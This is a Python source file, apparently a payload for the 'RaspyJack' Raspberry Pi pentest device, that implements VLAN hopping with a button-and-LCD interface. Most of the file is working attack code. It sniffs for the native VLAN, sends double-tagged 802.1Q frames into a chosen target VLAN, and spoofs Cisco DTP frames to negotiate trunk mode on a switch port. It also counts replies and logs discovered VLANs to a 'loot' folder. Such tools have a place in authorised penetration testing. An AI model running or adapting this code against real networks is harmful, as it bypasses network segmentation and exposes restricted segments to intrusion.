#!/usr/bin/env python3
"""
RaspyJack Payload -- VLAN Hopper
================================
Author: 7h30th3r0n3

VLAN hopping via double-tagging and DTP spoofing.  Discovers the native
VLAN by sniffing, then sends double-tagged frames or DTP negotiation
packets to reach target VLANs.

Controls:
  OK         -- Start hopping
  UP / DOWN  -- Select target VLAN
  KEY1       -- Toggle double-tag / DTP spoof mode
  KEY2       -- Send test ping to target VLAN
  KEY3       -- Exit
"""

import os
import sys
import time
import struct
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        Ether, Dot1Q, IP, ICMP, LLC, SNAP, Raw,
        sendp, sniff as scapy_sniff, get_if_hwaddr, conf, raw,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
LOOT_DIR = "/root/Raspyjack/loot/VLANHop"

# DTP multicast destination
DTP_MULTICAST = "01:00:0c:cc:cc:cc"
# DTP domain TLV type
DTP_SNAP_OUI = b"\x00\x00\x0c"
DTP_SNAP_CODE = 0x2004

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
_running = True
hopping = False
mode = "double-tag"   # "double-tag" or "dtp"
native_vlan = 1
target_vlan = 100
pkts_sent = 0
pkts_received = 0
status_msg = "Ready"
iface = "eth0"
detected_vlans = set()
scroll = 0


# ---------------------------------------------------------------------------
# Interface detection
# ---------------------------------------------------------------------------

def _detect_interface():
    """Detect the best wired interface."""
    for candidate in ["eth0", "enp0s3", "ens33"]:
        try:
            r = subprocess.run(["ip", "link", "show", candidate],
                               capture_output=True, text=True, timeout=5)
            if "UP" in r.stdout:
                return candidate
        except Exception:
            pass
    try:
        r = subprocess.run(["ip", "-o", "link", "show", "up"],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            parts = line.split(":")
            if len(parts) >= 2:
                name = parts[1].strip()
                if name != "lo" and not name.startswith("wlan"):
                    return name
    except Exception:
        pass
    return "eth0"


def _get_mac(iface_name):
    """Get the MAC address of an interface."""
    try:
        return get_if_hwaddr(iface_name)
    except Exception:
        pass
    try:
        with open(f"/sys/class/net/{iface_name}/address") as f:
            return f.read().strip()
    except Exception:
        return "00:00:00:00:00:00"


def _get_ip(iface_name):
    """Get IPv4 address of the interface."""
    try:
        r = subprocess.run(["ip", "-4", "addr", "show", iface_name],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return "0.0.0.0"


# ---------------------------------------------------------------------------
# Native VLAN discovery thread
# ---------------------------------------------------------------------------

def _discover_native_vlan_thread(iface_name):
    """Sniff for tagged frames to discover the native VLAN."""
    global native_vlan, status_msg

    found_vlans = set()

    def _handle(pkt):
        if not _running:
            return
        if pkt.haslayer(Dot1Q):
            vlan_id = pkt[Dot1Q].vlan
            found_vlans.add(vlan_id)

    with lock:
        status_msg = "Discovering native VLAN..."

    try:
        scapy_sniff(iface=iface_name, prn=_handle, timeout=8, store=False,
                    filter="vlan")
    except Exception:
        pass

    # Also try CDP/DTP frames for VLAN info
    def _handle_dtp(pkt):
        if not _running:
            return
        if pkt.haslayer(Ether) and pkt[Ether].dst == DTP_MULTICAST:
            pkt_raw = raw(pkt)
            # Try to extract native VLAN from DTP
            idx = pkt_raw.find(b"\x00\x01")  # domain TLV
            if idx >= 0:
                found_vlans.add(1)

    try:
        scapy_sniff(iface=iface_name, prn=_handle_dtp, timeout=5, store=False,
                    filter="ether dst 01:00:0c:cc:cc:cc")
    except Exception:
        pass

    with lock:
        detected_vlans.update(found_vlans)
        if found_vlans:
            native_vlan = min(found_vlans)
            status_msg = f"Native VLAN: {native_vlan}"
        else:
            native_vlan = 1
            status_msg = "Assume native VLAN 1"


# ---------------------------------------------------------------------------
# Double-tag hopping thread
# ---------------------------------------------------------------------------

def _double_tag_thread(iface_name, src_mac, nat_vlan, tgt_vlan):
    """Send double-tagged frames to hop to target VLAN."""
    global pkts_sent, hopping, status_msg

    # Double-tag: outer tag = native VLAN, inner tag = target VLAN
    # The switch strips the outer tag (native) and forwards with inner tag
    for probe_id in range(1, 101):
        if not _running or not hopping:
            break

        pkt = (Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
               / Dot1Q(vlan=nat_vlan)
               / Dot1Q(vlan=tgt_vlan)
               / IP(src="0.0.0.0", dst="255.255.255.255")
               / ICMP(type=8, id=probe_id, seq=probe_id)
               / Raw(load=b"RASPYJACK_VLAN_PROBE"))

        try:
            sendp(pkt, iface=iface_name, verbose=False)
            with lock:
                pkts_sent += 1
                status_msg = f"Sent {pkts_sent} probes VLAN {tgt_vlan}"
        except Exception:
            pass

        time.sleep(0.2)

    with lock:
        hopping = False
        status_msg = f"Done: {pkts_sent} pkts to VLAN {tgt_vlan}"


# ---------------------------------------------------------------------------
# DTP spoof thread
# ---------------------------------------------------------------------------

def _build_dtp_frame(src_mac):
    """Build a DTP frame to negotiate trunk mode."""
    # DTP frame: Ether / LLC / SNAP / DTP payload
    # TLV: type(2) + length(2) + value
    domain = b"RASPYJACK"
    # Domain TLV (type 0x0001)
    domain_tlv = struct.pack("!HH", 0x0001, 4 + len(domain)) + domain
    # Status TLV (type 0x0002): 0x03 = desirable trunk
    status_tlv = struct.pack("!HH", 0x0002, 5) + b"\x03"
    # Type TLV (type 0x0003): 0xa5 = 802.1Q
    type_tlv = struct.pack("!HH", 0x0003, 5) + b"\xa5"
    # Neighbor TLV (type 0x0004)
    mac_bytes = bytes.fromhex(src_mac.replace(":", ""))
    neighbor_tlv = struct.pack("!HH", 0x0004, 4 + len(mac_bytes)) + mac_bytes

    dtp_payload = domain_tlv + status_tlv + type_tlv + neighbor_tlv

    pkt = (Ether(src=src_mac, dst=DTP_MULTICAST)
           / LLC(dsap=0xAA, ssap=0xAA, ctrl=0x03)
           / SNAP(OUI=0x00000C, code=DTP_SNAP_CODE)
           / Raw(load=dtp_payload))
    return pkt


def _dtp_spoof_thread(iface_name, src_mac):
    """Send DTP frames to negotiate trunk status."""
    global pkts_sent, hopping, status_msg

    dtp_pkt = _build_dtp_frame(src_mac)

    for i in range(30):
        if not _running or not hopping:
            break
        try:
            sendp(dtp_pkt, iface=iface_name, verbose=False)
            with lock:
                pkts_sent += 1
                status_msg = f"DTP sent: {pkts_sent}"
        except Exception:
            pass
        # DTP every 1 second
        deadline = time.time() + 1.0
        while time.time() < deadline and hopping and _running:
            time.sleep(0.1)

    with lock:
        hopping = False
        status_msg = f"DTP done: {pkts_sent} frames"


# ---------------------------------------------------------------------------
# Response sniffer thread
# ---------------------------------------------------------------------------

def _response_sniffer_thread(iface_name):
    """Sniff for responses from the target VLAN."""
    global pkts_received

    def _handle(pkt):
        if not _running:
            return
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load
            if b"RASPYJACK" in payload:
                return  # Ignore our own probes
        if pkt.haslayer(Dot1Q):
            with lock:
                pkts_received += 1
                detected_vlans.add(pkt[Dot1Q].vlan)

    try:
        scapy_sniff(iface=iface_name, prn=_handle, store=False,
                    filter="vlan",
                    stop_filter=lambda _: not _running)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Test ping
# ---------------------------------------------------------------------------

def _send_test_ping(iface_name, src_mac, nat_vlan, tgt_vlan):
    """Send a single double-tagged ICMP echo to the target VLAN."""
    global pkts_sent, status_msg
    pkt = (Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
           / Dot1Q(vlan=nat_vlan)
           / Dot1Q(vlan=tgt_vlan)
           / IP(src="0.0.0.0", dst="255.255.255.255")
           / ICMP(type=8, id=0xBEEF, seq=1)
           / Raw(load=b"PING_VLAN_TEST"))
    try:
        sendp(pkt, iface=iface_name, verbose=False)
        with lock:
            pkts_sent += 1
            status_msg = f"Test ping VLAN {tgt_vlan}"
    except Exception:
        with lock:
            status_msg = "Ping failed"


# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def _draw_frame(lcd, font):
    """Render current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "VLAN HOPPER", font=font, fill="#00CCFF")
    d.ellipse((118, 3, 122, 7), fill="#00FF00" if hopping else "#444")

    with lock:
        msg = status_msg
        cur_mode = mode
        nat = native_vlan
        tgt = target_vlan
        sent = pkts_sent
        recv = pkts_received
        vlans = sorted(detected_vlans)

    d.text((2, 16), msg[:24], font=font, fill="#AAAAAA")
    d.text((2, 28), f"Native: {nat}  Target: {tgt}", font=font, fill="#FFAA00")
    d.text((2, 38), f"Mode: {cur_mode}", font=font, fill="#888")
    d.text((2, 48), f"Sent: {sent}  Recv: {recv}", font=font, fill="#888")

    # Detected VLANs
    d.text((2, 60), "Detected VLANs:", font=font, fill="#666")
    if vlans:
        vlan_str = ", ".join(str(v) for v in vlans[:10])
        d.text((2, 72), vlan_str[:24], font=font, fill="#CCCCCC")
    else:
        d.text((2, 72), "none", font=font, fill="#666")

    # Target VLAN selector arrows
    d.text((2, 86), f"[UP/DOWN] VLAN: {tgt}", font=font, fill="#00FF88")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    if hopping:
        d.text((2, 117), "Hopping... K3:Exit", font=font, fill="#888")
    else:
        d.text((2, 117), "OK:Hop K1:Mode K3:Quit", font=font, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _running, hopping, mode, target_vlan, status_msg, iface
    global pkts_sent, pkts_received

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font()

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    iface = _detect_interface()
    src_mac = _get_mac(iface)
    status_msg = f"Iface: {iface}"

    # Start native VLAN discovery
    threading.Thread(target=_discover_native_vlan_thread, args=(iface,),
                     daemon=True).start()

    # Start response sniffer
    threading.Thread(target=_response_sniffer_thread, args=(iface,),
                     daemon=True).start()

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "OK" and not hopping:
                hopping = True
                pkts_sent = 0
                if mode == "double-tag":
                    threading.Thread(
                        target=_double_tag_thread,
                        args=(iface, src_mac, native_vlan, target_vlan),
                        daemon=True).start()
                else:
                    threading.Thread(
                        target=_dtp_spoof_thread,
                        args=(iface, src_mac),
                        daemon=True).start()
                time.sleep(0.3)

            elif btn == "KEY1" and not hopping:
                mode = "dtp" if mode == "double-tag" else "double-tag"
                with lock:
                    status_msg = f"Mode: {mode}"
                time.sleep(0.3)

            elif btn == "KEY2" and not hopping:
                _send_test_ping(iface, src_mac, native_vlan, target_vlan)
                time.sleep(0.3)

            elif btn == "UP":
                target_vlan = min(4094, target_vlan + 1)
                time.sleep(0.1)

            elif btn == "DOWN":
                target_vlan = max(1, target_vlan - 1)
                time.sleep(0.1)

            _draw_frame(lcd, font)
            time.sleep(0.05)

    finally:
        _running = False
        hopping = False
        time.sleep(0.3)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
